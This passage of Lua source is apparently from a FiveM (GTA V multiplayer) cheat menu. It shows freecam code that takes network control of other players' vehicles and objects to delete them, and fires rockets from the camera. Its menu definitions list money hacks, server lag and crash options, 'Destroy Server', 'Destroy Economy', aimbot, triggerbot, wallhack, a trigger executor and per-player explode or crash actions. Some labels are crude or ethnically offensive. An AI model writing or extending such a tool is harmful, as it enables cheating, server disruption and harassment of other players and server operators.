                            local model = LoadModel(objectlist[objectnamelist[Toggles['Freecam object']]])
                            local obj = CreateObject(model, GetCamCoord(cam) + (RotationToDirection(GetCamRot(cam, 2)) * 15), true, true, true)
                            SetEntityHeading(obj, GetCamRot(cam).z)
                        end)
                    end

                    if vehicletimer <= GetGameTimer() then
                        closest = nil

                        for k, v in pairs(GetStuff('Vehicle')) do
                            if #(GetEntityCoords(v) - Markerloc) <= 4.5 then
                                if closest then
                                    if #(GetEntityCoords(v) - Markerloc) <= #(GetEntityCoords(v) - GetEntityCoords(closest)) then
                                        closest = v
                                    end
                                else
                                    closest = v
                                end
                            end
                            
                        end

                        for k, v in pairs(GetStuff('Object')) do
                            if GetEntityAlpha(v) == 255 then
                                if #(GetEntityCoords(v) - Markerloc) <= 4.5 then
                                    if closestobj then
                                        if #(GetEntityCoords(v) - Markerloc) <= #(GetEntityCoords(v) - GetEntityCoords(closestobj)) then
                                            closestobj = v
                                        end
                                    else
                                        closestobj = v
                                    end
                                end
                            end
                        end

                        vehicletimer = GetGameTimer() + 250
                    end

                    if closest then
                        DrawEntityBox(closest, RGB(0.5))
                    end

                    if closestobj then
                        DrawEntityBox(closestobj, RGB(0.5))
                    end
                
                    if IsDisabledControlJustReleased(0, 44) then
                        if closest then 
                            if DoesEntityExist(closest) then
                                Toggles['Freecam'] = false

                                for k, v in pairs(Objects[26]) do
                                    if v['Text'] == 'Freecam' then
                                        v['Enabled'] = false
                                        break
                                    end
                                end

                                if DoesEntityExist(fakeobj) then
                                    DeleteEntity(fakeobj)
                                end

                                local driver = GetPedInVehicleSeat(closest, -1)
                                if DoesEntityExist(driver) then
                                    ClearPedTasksImmediately(driver)
                                end

                                CreateThread(function()
                                    TakeControl(closest)
                                end)
                                
                                Wait(250)

                                break
                            end
                        end
                    end

                    DisableControlAction(0, 24)
                    DisableControlAction(0, 44)

                    if DoesEntityExist(fakeobj) then
                        if Toggles['Object preview'] then
                            if GetEntityModel(fakeobj) == LoadModel(objectlist[objectnamelist[Toggles['Freecam object']]]) then
                                SetEntityCoords(fakeobj, GetCamCoord(cam) + (RotationToDirection(GetCamRot(cam, 2)) * 15))
                                SetEntityHeading(fakeobj, GetCamRot(cam).z)
                                SetEntityAlpha(fakeobj, 204)
                                SetEntityCollision(fakeobj, false, false)
                            else
                                DeleteEntity(fakeobj)
                                fakeobj = CreateObject(model, GetCamCoord(cam) + (RotationToDirection(GetCamRot(cam, 2)) * 15), false, true, true)
                            end
                        else
                            DeleteEntity(fakeobj)
                        end
                    else
                        if Toggles['Object preview'] then
                            local model = LoadModel(objectlist[objectnamelist[Toggles['Freecam object']]])
                            if model then
                                fakeobj = CreateObject(model, GetCamCoord(cam) + (RotationToDirection(GetCamRot(cam, 2)) * 15), false, true, true)
                            end
                        end
                    end

                    if IsControlJustReleased(0, 25) then
                        if DoesEntityExist(closestobj) then
                            CreateThread(function()
                                while DoesEntityExist(closestobj) do
                                    while not NetworkHasControlOfEntity(closestobj) do
                                        NetworkRequestControlOfEntity(closestobj)
                                        Wait(0)
                                    end
                                    SetEntityAsMissionEntity(closestobj, true, true)
                                    DeleteEntity(closestobj)
                                    Wait(100)
                                end
                            end)
                        else
                            if DoesEntityExist(closest) then
                                CreateThread(function()
                                    local driver = GetPedInVehicleSeat(closest, -1)
                                    if DoesEntityExist(driver) then
                                        ClearPedTasksImmediately(driver)
                                    end

                                    while DoesEntityExist(closest) do
                                        while not NetworkHasControlOfEntity(closest) do
                                            NetworkRequestControlOfEntity(closest)
                                            Wait(0)
                                        end
                                        SetEntityAsMissionEntity(closest, true, true)
                                        DeleteEntity(closest)
                                        Wait(100)
                                    end
                                end)
                            end
                        end
                    end

                    Markerloc = GetCamCoord(cam) + (RotationToDirection(GetCamRot(cam, 2)) * 4)

                    if IsControlPressed(0, 348) and weapondelay <= GetGameTimer() then
                        RequestWeaponAsset(GetHashKey("WEAPON_STUNGUN")) 
                        while not HasWeaponAssetLoaded(GetHashKey("WEAPON_STUNGUN")) do
                            Wait(0)
                        end
                        ShootSingleBulletBetweenCoords(GetCamCoord(cam) + RotationToDirection(GetCamRot(cam, 2)), Markerloc, 0, false, GetHashKey("WEAPON_STUNGUN"), 0, true, false, -1.0)
                        
                        weapondelay = GetGameTimer() + 50
                    end

                    if IsControlPressed(0, 51) and weapondelay <= GetGameTimer() then
                        RequestWeaponAsset(GetHashKey("WEAPON_RPG")) 
                        while not HasWeaponAssetLoaded(GetHashKey("WEAPON_RPG")) do
                            Wait(0)
                        end
                        ShootSingleBulletBetweenCoords(GetCamCoord(cam) + RotationToDirection(GetCamRot(cam, 2)), Markerloc, 0, false, GetHashKey("WEAPON_RPG"), 0, true, false, -1.0)
                        
                        weapondelay = GetGameTimer() + 50
                    end
                end
            end)
        else
            
            DestroyCam(freecamcam)
            ClearTimecycleModifier()
            RenderScriptCams(false, false, 0, 1, 0)
            FreezeEntityPosition(PlayerPedId(), false)
            SetFocusEntity(PlayerPedId())
            Wait(250)
            DeleteEntity(fakeobj)
            ClearFocus()
        end
    end
end

CreateThread(function()
    while true do
        Wait(0)

        if Toggles['Vehicle nitro [L CTRL]'] then
            local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
            if DoesEntityExist(vehicle) then
                if GetPedInVehicleSeat(vehicle, -1) == PlayerPedId() then
                    if IsDisabledControlPressed(0, 36) then
                        SetVehicleBoostActive(vehicle, true)
                        StartScreenEffect('RaceTurbo', 0, 0)
                        SetVehicleForwardSpeed(vehicle, GetEntitySpeed(vehicle) + 15)
                        Wait(1000)
                    end
                end
            end
        end

    end
end)

Objects = {
    {
        {
            ['Text'] = '👨‍🔧 Self Options',
            ['Type'] = 'menu',
            ['Menu'] = 2
        },
        {
            ['Text'] = '🔪 Weapon Options',
            ['Type'] = 'menu',
            ['Menu'] = 7
        },
        {
            ['Text'] = '👁‍🗨 Wallhack',
            ['Type'] = 'menu',
            ['Menu'] = 8,
        },
        {
            ['Text'] = '🌏 Online Options',
            ['Type'] = 'menu',
            ['Menu'] = 9
        },
        {
            ['Text'] = '🌌 Server Options',
            ['Type'] = 'menu',
            ['Menu'] = 6
        },
        {
            ['Text'] = '🚘 Vehicle Options',
            ['Type'] = 'menu',
            ['Menu'] = 12
        },
        {
            ['Text'] = '🌄 Weather Options',
            ['Type'] = 'menu',
            ['Menu'] = 18
        },
        {
            ['Text'] = '⚙️ Menu Options',
            ['Type'] = 'menu',
            ['Menu'] = 3
        },
        {
            ['Text'] = '💡 Misc',
            ['Type'] = 'menu',
            ['Menu'] = 11
        },
        {
            ['Text'] = '💬 Trigger Executor',
            ['Type'] = 'button',
            ['cb'] = CustomCode
        },
        {
            ['Text'] = '🧍‍♂️ Ped Menu',
            ['Type'] = 'menu',
            ['Menu'] = 24
        },
        {
            ['Text'] = '💥 Destroy Server',
            ['Type'] = 'menu',
            ['Menu'] = 5
        },
        {
            ['Text'] = '❌ Exit Menu',
            ['Type'] = 'button',
            ['cb'] = function()
                Toggles = {['Menu sounds'] = true, ['Freecam speed'] = 1, ['Freecam object'] = 1}
                MenuDisabled = true
            end
        },
        -- {
        --     ['Text'] = 'Crash',
        --     ['Type'] = 'button',
        --     ['cb'] = Crash
        -- },
    },
    {
        
        {
            ['Text'] = '💊[ESX] Revive',
            ['Type'] = 'button',
            ['cb'] = MenuPress
        },
        {
            ['Text'] = '💊[CRP] Revive',
            ['Type'] = 'button',
            ['cb'] = MenuPress
        },
        {
            ['Text'] = '💸Money Hack 1',
            ['Type'] = 'button',
            ['cb'] = MenuPress
        },
        {
            ['Text'] = '💸Money Hack 2',
            ['Type'] = 'button',
            ['cb'] = MenuPress
        },
        {
            ['Text'] = '✨Zombie SW Give Item',
            ['Type'] = 'button',
            ['cb'] = Itemver
        },
        {
            ['Text'] = 'Teleport menu →',
            ['Type'] = 'menu',
            ['Menu'] = 21,
        },
        {
            ['Text'] = 'Freecam menu →',
            ['Type'] = 'menu',
            ['Menu'] = 26,
        },
        {
            ['Text'] = 'Animations menu →',
            ['Type'] = 'menu',
            ['Menu'] = 22,
        },
        {
            ['Text'] = 'Godmode',
            ['Type'] = 'list',
            ['Items'] = {
                'off',
                'safe',
                'godmode'
            },
            ['Current'] = 1,
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Effect',
            ['Type'] = 'list',
            ['Items'] = {
                'none',
                'drunk',
                'high',
            },
            ['Current'] = 1,
            ['cb'] = EnableEffect
        },
        {
            ['Text'] = 'Refill',
            ['Type'] = 'list',
            ['Items'] = {
                'Health',
                'Armour'
            },
            ['Current'] = 1,
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Noclip',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress 
        },
        {
            ['Text'] = 'Invisible',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Infinite stamina',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'No ragdoll',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Super run',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Super jump',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Radar',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Delete attached',
            ['Type'] = 'button',
            ['cb'] = MenuPress,
        },
        {
            ['Text'] = 'Suicide',
            ['Type'] = 'button',
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Back',
            ['Type'] = 'menu',
            ['Menu'] = 1
        },
    }, 
    {
        {
            ['Text'] = 'Server ip: ' .. GetCurrentServerEndpoint(),
            ['Type'] = 'button',
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Server resources: ' .. GetNumResources() .. ' →',
            ['Type'] = 'menu',
            ['Menu'] = 4,
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Menu X offset',
            ['Type']  = 'list',
            ['Items'] = {
                '0.1', '0.15', '0.2', '0.25', '0.3', '0.35', '0.4', '0.45', '0.5', '0.55', '0.6', '0.65', '0.7', '0.75', '0.8', '0.85', '0.9'
            },
            ['Current'] = 17,
            ['cb'] = SetMenuOffsets
        },
        {
            ['Text'] = 'Menu Y offset',
            ['Type']  = 'list',
            ['Items'] = {
                '0.3', '0.35', '0.4', '0.45', '0.5', '0.55', '0.6', '0.65', '0.7', '0.745',
            },
            ['Current'] = 5,
            ['cb'] = SetMenuOffsets
        },
        {
            ['Text'] = 'Menu sounds',
            ['Type'] = 'toggle',
            ['Enabled'] = true,
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Show coords',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Show toggles',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Menu Red',
            ['Type'] = 'list',
            ['Items'] = {
                '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21', '22', '23', '24', '25', '26', '27', '28', '29', '30', '31', '32', '33', '34', '35', '36', '37', '38', '39', '40', '41', '42', '43', '44', '45', '46', '47', '48', '49', '50', '51', '52', '53', '54', '55', '56', '57', '58', '59', '60', '61', '62', '63', '64', '65', '66', '67', '68', '69', '70', '71', '72', '73', '74', '75', '76', '77', '78', '79', '80', '81', '82', '83', '84', '85', '86', '87', '88', '89', '90', '91', '92', '93', '94', '95', '96', '97', '98', '99', '100', '101', '102', '103', '104', '105', '106', '107', '108', '109', '110', '111', '112', '113', '114', '115', '116', '117', '118', '119', '120', '121', '122', '123', '124', '125', '126', '127', '128', '129', '130', '131', '132', '133', '134', '135', '136', '137', '138', '139', '140', '141', '142', '143', '144', '145', '146', '147', '148', '149', '150', '151', '152', '153', '154', '155', '156', '157', '158', '159', '160', '161', '162', '163', '164', '165', '166', '167', '168', '169', '170', '171', '172', '173', '174', '175', '176', '177', '178', '179', '180', '181', '182', '183', '184', '185', '186', '187', '188', '189', '190', '191', '192', '193', '194', '195', '196', '197', '198', '199', '200', '201', '202', '203', '204', '205', '206', '207', '208', '209', '210', '211', '212', '213', '214', '215', '216', '217', '218', '219', '220', '221', '222', '223', '224', '225', '226', '227', '228', '229', '230', '231', '232', '233', '234', '235', '236', '237', '238', '239', '240', '241', '242', '243', '244', '245', '246', '247', '248', '249', '250', '251', '252', '253', '254', '255'
            },
            ['Current'] = 256,
            ['cb'] = SetMenuData
        },
        {
            ['Text'] = 'Menu Green',
            ['Type'] = 'list',
            ['Items'] = {
                '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21', '22', '23', '24', '25', '26', '27', '28', '29', '30', '31', '32', '33', '34', '35', '36', '37', '38', '39', '40', '41', '42', '43', '44', '45', '46', '47', '48', '49', '50', '51', '52', '53', '54', '55', '56', '57', '58', '59', '60', '61', '62', '63', '64', '65', '66', '67', '68', '69', '70', '71', '72', '73', '74', '75', '76', '77', '78', '79', '80', '81', '82', '83', '84', '85', '86', '87', '88', '89', '90', '91', '92', '93', '94', '95', '96', '97', '98', '99', '100', '101', '102', '103', '104', '105', '106', '107', '108', '109', '110', '111', '112', '113', '114', '115', '116', '117', '118', '119', '120', '121', '122', '123', '124', '125', '126', '127', '128', '129', '130', '131', '132', '133', '134', '135', '136', '137', '138', '139', '140', '141', '142', '143', '144', '145', '146', '147', '148', '149', '150', '151', '152', '153', '154', '155', '156', '157', '158', '159', '160', '161', '162', '163', '164', '165', '166', '167', '168', '169', '170', '171', '172', '173', '174', '175', '176', '177', '178', '179', '180', '181', '182', '183', '184', '185', '186', '187', '188', '189', '190', '191', '192', '193', '194', '195', '196', '197', '198', '199', '200', '201', '202', '203', '204', '205', '206', '207', '208', '209', '210', '211', '212', '213', '214', '215', '216', '217', '218', '219', '220', '221', '222', '223', '224', '225', '226', '227', '228', '229', '230', '231', '232', '233', '234', '235', '236', '237', '238', '239', '240', '241', '242', '243', '244', '245', '246', '247', '248', '249', '250', '251', '252', '253', '254', '255'
            },
            ['Current'] = 256,
            ['cb'] = SetMenuData
        },
        {
            ['Text'] = 'Menu Blue',
            ['Type'] = 'list',
            ['Items'] = {
                '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21', '22', '23', '24', '25', '26', '27', '28', '29', '30', '31', '32', '33', '34', '35', '36', '37', '38', '39', '40', '41', '42', '43', '44', '45', '46', '47', '48', '49', '50', '51', '52', '53', '54', '55', '56', '57', '58', '59', '60', '61', '62', '63', '64', '65', '66', '67', '68', '69', '70', '71', '72', '73', '74', '75', '76', '77', '78', '79', '80', '81', '82', '83', '84', '85', '86', '87', '88', '89', '90', '91', '92', '93', '94', '95', '96', '97', '98', '99', '100', '101', '102', '103', '104', '105', '106', '107', '108', '109', '110', '111', '112', '113', '114', '115', '116', '117', '118', '119', '120', '121', '122', '123', '124', '125', '126', '127', '128', '129', '130', '131', '132', '133', '134', '135', '136', '137', '138', '139', '140', '141', '142', '143', '144', '145', '146', '147', '148', '149', '150', '151', '152', '153', '154', '155', '156', '157', '158', '159', '160', '161', '162', '163', '164', '165', '166', '167', '168', '169', '170', '171', '172', '173', '174', '175', '176', '177', '178', '179', '180', '181', '182', '183', '184', '185', '186', '187', '188', '189', '190', '191', '192', '193', '194', '195', '196', '197', '198', '199', '200', '201', '202', '203', '204', '205', '206', '207', '208', '209', '210', '211', '212', '213', '214', '215', '216', '217', '218', '219', '220', '221', '222', '223', '224', '225', '226', '227', '228', '229', '230', '231', '232', '233', '234', '235', '236', '237', '238', '239', '240', '241', '242', '243', '244', '245', '246', '247', '248', '249', '250', '251', '252', '253', '254', '255'
            },
            ['Current'] = 256,
            ['cb'] = SetMenuData
        },
        {
            ['Text'] = 'Menu Alpha',
            ['Type'] = 'list',
            ['Items'] = {
                '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21', '22', '23', '24', '25', '26', '27', '28', '29', '30', '31', '32', '33', '34', '35', '36', '37', '38', '39', '40', '41', '42', '43', '44', '45', '46', '47', '48', '49', '50', '51', '52', '53', '54', '55', '56', '57', '58', '59', '60', '61', '62', '63', '64', '65', '66', '67', '68', '69', '70', '71', '72', '73', '74', '75', '76', '77', '78', '79', '80', '81', '82', '83', '84', '85', '86', '87', '88', '89', '90', '91', '92', '93', '94', '95', '96', '97', '98', '99', '100', '101', '102', '103', '104', '105', '106', '107', '108', '109', '110', '111', '112', '113', '114', '115', '116', '117', '118', '119', '120', '121', '122', '123', '124', '125', '126', '127', '128', '129', '130', '131', '132', '133', '134', '135', '136', '137', '138', '139', '140', '141', '142', '143', '144', '145', '146', '147', '148', '149', '150', '151', '152', '153', '154', '155', '156', '157', '158', '159', '160', '161', '162', '163', '164', '165', '166', '167', '168', '169', '170', '171', '172', '173', '174', '175', '176', '177', '178', '179', '180', '181', '182', '183', '184', '185', '186', '187', '188', '189', '190', '191', '192', '193', '194', '195', '196', '197', '198', '199', '200', '201', '202', '203', '204', '205', '206', '207', '208', '209', '210', '211', '212', '213', '214', '215', '216', '217', '218', '219', '220', '221', '222', '223', '224', '225', '226', '227', '228', '229', '230', '231', '232', '233', '234', '235', '236', '237', '238', '239', '240', '241', '242', '243', '244', '245', '246', '247', '248', '249', '250', '251', '252', '253', '254', '255'
            },
            ['Current'] = 256,
            ['cb'] = SetMenuData
        },
        {
            ['Text'] = 'Delay (ms)',
            ['Type'] = 'list',
            ['Items'] = {
                '25', '50', '75', '100', '125', '150', '175', '200', '225', '250', '275', '300', '325', '350', '375',' 400', '425', '450', '475', '500'
            },
            ['Current'] = 5,
            ['cb'] = SetMenuData
        },
        {
            ['Text'] = 'Back',
            ['Type'] = 'menu',
            ['Menu'] = 1
        },
    },
    {},
    {
        {
            ['Text'] = 'Make All Players Black hole', 
            ['Type'] = 'button',
            ['cb'] = MenuPress,
        },
        {
            ['Text'] = 'Make All Players Rock', 
            ['Type'] = 'button',
            ['cb'] = MenuPress,
        },
        {
            ['Text'] = 'Map Blocker - PD', 
            ['Type'] = 'button',
            ['cb'] = MenuPress,
        },
        {
            ['Text'] = 'Map Blocker - Motel', 
            ['Type'] = 'button',
            ['cb'] = MenuPress,
        },
		{
            ['Text'] = 'Destroy Economy', 
            ['Type'] = 'button',
            ['cb'] = MenuPress,
        },
				{
            ['Text'] = 'Map Fucker (Mountain)', 
            ['Type'] = 'button',
            ['cb'] = MenuPress,
        },
        {
            ['Text'] = 'Back',
            ['Type'] = 'menu',
            ['Menu'] = 1
        },
    },
    {
        {
            ['Text'] = 'Interactsound menu →',
            ['Type'] = 'menu',
            ['Menu'] = 23,
        },
        {
            ['Text'] = '🔞 Fuck all players',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress,
        },
    --    {
   --         ['Text'] = 'Explode everyone',
     --       ['Type'] = 'toggle',
     --       ['Enabled'] = false,
    --        ['cb'] = MenuPress,
   --     },
        {
            ['Text'] = 'Lag Server !Danger',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Prop Attach',
            ['Type'] = 'list',
            ['Items'] = {
                'Turkey Flag',
                'Washer',
                'Toilet',
                'Dildo',
                'helicopter'
            },
            ['Current'] = 1,
            ['cb'] = MenuPress,
        },
        {
            ['Text'] = 'Remove spawned props',
            ['Type'] = 'button',
            ['cb'] = MenuPress,
        },
        {
            ['Text'] = 'Back',
            ['Type'] = 'menu',
            ['Menu'] = 1,
        },
    },
    {
        {
            ['Text'] = 'Weapon customization →',
            ['Type'] = 'menu',
            ['Menu'] = 19,
        },
        {
            ['Text'] = 'Ammo customization →',
            ['Type'] = 'menu',
            ['Menu'] = 25,
        },
		        {
            ['Text'] = '👩🏾‍🔧 QB İTEM',
            ['Type'] = 'button',
            ['cb'] = qbgiveitem,
        },
	    {
            ['Text'] = '👩🏾‍🔧 M3 İTEM',
            ['Type'] = 'button',
            ['cb'] = m3giveweapon,
        },
	     {
            ['Text'] = '👩🏾‍🔧 DİSC İTEM',
            ['Type'] = 'button',
            ['cb'] = Discgiveitem,
        },
        {
            ['Text'] = 'Rapid Fire',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress,
        },
        {
            ['Text'] = 'Explosive hands',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress,
        },
        {
            ['Text'] = 'Aimbot',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress,
        },
        {
            ['Text'] = 'Aimbot [fov]',
            ['Type'] = 'list',
            ['Items'] = {
                '0.05', '0.1', '0.15', '0.2', '0.25', '0.3', '0.35', '0.4', '0.45', '0.5', '0.55', '0.6', '0.65', '0.7', '0.75', '0.8', '0.85', '0.9', '0.95', '1.0'
            },
            ['Current'] = 5,
            ['cb'] = MenuPress,
        },
        {
            ['Text'] = 'Aimbot [bone]',
            ['Type'] = 'list',
            ['Items'] = {
                'body', 'head', 'pelvis', 'right calf', 'left calf', 'right foot', 'left foot', 'closest'
            },
            ['Current'] = 1,
            ['cb'] = MenuPress,
        },
        {
            ['Text'] = 'Show Aimbot fov',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress,
        },
        {
            ['Text'] = 'TriggerBot',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'SpinBot',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress,
        },
        {
            ['Text'] = 'Crosshair',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress,
        },
        {
            ['Text'] = 'Give all weapons',
            ['Type'] = 'button',
            ['cb'] = MenuPress,
        },
        {
            ['Text'] = 'Remove all weapons',
            ['Type'] = 'button',
            ['cb'] = MenuPress,
        },
        {
            ['Text'] = 'Back',
            ['Type'] = 'menu',
            ['Menu'] = 1,
        },
    },
    {
        {
            ['Text'] = 'Include self',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Distance',
            ['Type'] = 'list',
            ['Items'] = {'infinite', '25.0', '50.0', '75.0', '100.0', '150.0', '200.0', '300.0', '400.0', '500.0', '750.0', '1000.0', '1250.0', '1500.0', '1750.0', '2000.0'},
            ['Current'] = 1,
            ['cb'] = function(data)
                Toggles['ESP Distance'] = data['Items'][data['Current']]
            end
        },
        {
            ['Text'] = '2D BOX',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Player Lines',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Names',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Player blips',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = PlayerBlips
        },
        {
            ['Text'] = 'Back',
            ['Type'] = 'menu',
            ['Menu'] = 1,
        },
    },
    {},
    {
        {
            ['Text'] = 'Spectate',
            ['Type'] = 'button',
            ['cb'] = OnlinePlayer,
        },
        {
            ['Text'] = 'Teleport',
            ['Type'] = 'button',
            ['cb'] = OnlinePlayer,
        },
        {
            ['Text'] = 'Explode',
            ['Type'] = 'list',
            ['Items'] = {
                'silent',
                'loud',
            },
            ['Current'] = 1,
            ['cb'] = OnlinePlayer,
        },
        -- {
        --     ['Text'] = 'Remove all weapons',
        --     ['Type'] = 'button',
        --     ['cb'] = OnlinePlayer,
        -- },
        {
            ['Text'] = 'Give health',
            ['Type'] = 'button',
            ['cb'] = OnlinePlayer,
        },
        {
            ['Text'] = 'Play sound on player',
            ['Type'] = 'list',
            ['Items'] = interactsoundaudios,
            ['Current'] = 1,
            ['cb'] = PlayInteractSound,
        },
        {
            ['Text'] = 'Give Armour',
            ['Type'] = 'button',
            ['cb'] = OnlinePlayer,
        },
        {
            ['Text'] = 'Crash / lag',
            ['Type'] = 'button',
            ['cb'] = OnlinePlayer,
        },
        {
            ['Text'] = 'Cage Player',
            ['Type'] = 'button',
            ['cb'] = OnlinePlayer,
        },
        {
            ['Text'] = '👳 Arabic Kamikaze',
            ['Type'] = 'button',
            ['cb'] = OnlinePlayer
        },
        {
            ['Text'] = 'Drive-by [ped]',
            ['Type'] = 'button',
            ['cb'] = OnlinePlayer,
        },
        {
            ['Text'] = '☢️ Nuke',
            ['Type'] = 'button',
            ['cb'] = OnlinePlayer
        },
        {
            ['Text'] = 'Airstrike',
            ['Type'] = 'button',
            ['cb'] = OnlinePlayer
        },
        -- {
        --     ['Text'] = 'Bring vehicle',
        --     ['Type'] = 'button',
        --     ['cb'] = OnlinePlayer
        -- },
        {
            ['Text'] = 'Kick from vehicle',
            ['Type'] = 'button',
            ['cb'] = OnlinePlayer
        },
        {
        ['Text'] = 'Destroy vehicle',
        ['Type'] = 'button',
        ['cb'] = OnlinePlayer
        },
        {
            ['Text'] = 'Give all weapons',
            ['Type'] = 'button',
            ['cb'] = OnlinePlayer,
        },
        {
            ['Text'] = 'Give weapons',
            ['Type'] = 'list',
            ['Items'] = weapons,
            ['Current'] = 1,
            ['cb'] = OnlinePlayer,
        },
        {
            ['Text'] = 'Set as friend',
            ['Type'] = 'button',
            ['cb'] = OnlinePlayer
        },
        {
            ['Text'] = 'Esx Revive',
            ['Type'] = 'button',
            ['cb'] = OnlinePlayer
        },
        {
            ['Text'] = 'Back',
            ['Type'] = 'menu',
            ['Menu'] = 9,
        },
    },
    {
        {
            ['Text'] = '🎮  Discord RPC',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = rpc,
        },
        {
            ['Text'] = '💳  Bank Deposit',
            ['Type'] = 'button',
            ['cb'] = BankDeposit,
        },
        {
            ['Text'] = '💳  Bank Withdraw',
            ['Type'] = 'button',
            ['cb'] = BankWihtdraw,
        },
        {
            ['Text'] = '📢  Announce',
            ['Type'] = 'button',
            ['cb'] = Announce,
        },
        {
            ['Text'] = '👩🏾‍🔧 CRP Give Item',
            ['Type'] = 'button',
            ['cb'] = Crpitem,
        },
        {
            ['Text'] = '🍉  Watermelon Harvest',
            ['Type'] = 'button',
            ['cb'] = MenuPress,
        },
        {
            ['Text'] = '🍉  Watermelon Transform',
            ['Type'] = 'button',
            ['cb'] = MenuPress,
        },
        {
            ['Text'] = '🍉  Watermelon Sell',
            ['Type'] = 'button',
            ['cb'] = MenuPress,
        },
        {
            ['Text'] = '🍇  Grape Harvest',
            ['Type'] = 'button',
            ['cb'] = MenuPress,
        },
        {
            ['Text'] = '🍇  Grape Transform',
            ['Type'] = 'button',
            ['cb'] = MenuPress,
        },
        {
            ['Text'] = '🍷  Wine Sell',
            ['Type'] = 'button',
            ['cb'] = MenuPress,
        },
        {
            ['Text'] = 'Back',
            ['Type'] = 'menu',
            ['Menu'] = 1,
        }
    },
    {
        {
            ['Text'] = 'Vehicle spawner →',
            ['Type'] = 'menu',
            ['Menu'] = 17,
        },
        {
            ['Text'] = 'Drive to waypoint →',
            ['Type'] = 'menu',
            ['Menu'] = 13,
        },
        {
            ['Text'] = 'Los Santos Customs →',
            ['Type'] = 'menu',
            ['Menu'] = 14,
        },
        {
            ['Text'] = 'Speedometer',
            ['Type'] = 'list',
            ['Items'] = {
                'off',
                'km/h',
                'mph'
            },
            ['Current'] = 1,
            ['cb'] = CarMenu
        },
        {
            ['Text'] = 'Max fuel',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Insta brake [SPACE + S]',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Repair car',
            ['Type'] = 'button',
            ['cb'] = CarMenu
        },
        {
            ['Text'] = 'Stealth repair',
            ['Type'] = 'button',
            ['cb'] = CarMenu
        },
        {
            ['Text'] = 'Flip vehicle',
            ['Type'] = 'button',
            ['cb'] = function()
                local vehicle = GetVehiclePedIsUsing(PlayerPedId()) 
                if vehicle then
                    SetEntityCoords(vehicle, GetEntityCoords(vehicle) + vec3(0.0, 0.0, 2.0))
                    Wait(50)
                    SetVehicleOnGroundProperly(vehicle)
                end
            end
        },
        {
            ['Text'] = 'Wash car',
            ['Type'] = 'button',
            ['cb'] = CarMenu
        },
        {
            ['Text'] = 'Delete car',
            ['Type'] = 'button',
            ['cb'] = CarMenu
        },
        {
            ['Text'] = 'Unlock closest car',
            ['Type'] = 'button',
            ['cb'] = CarMenu
        },
        {
            ['Text'] = 'Back',
            ['Type'] = 'menu',
            ['Menu'] = 1,
        }
    },
    {
        {
            ['Text'] = 'Drive to waypoint',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Speed (km/h)',
            ['Type'] = 'list',
            ['Items'] = {
                '10', '20', '30', '40', '50', '60', '70', '80', '90', '100', '110',' 120', '130', '140', '150', '180', '200', '220'
            },
            ['Current'] = 5,
            ['cb'] = CarMenu
        },
        {
            ['Text'] = 'Back',
            ['Type'] = 'menu',
            ['Menu'] = 12
        }
    },
    {
        {
            ['Text'] = 'Vehicle cosmetics →',
            ['Type'] = 'menu',
            ['Menu'] = 15,
        },
        {
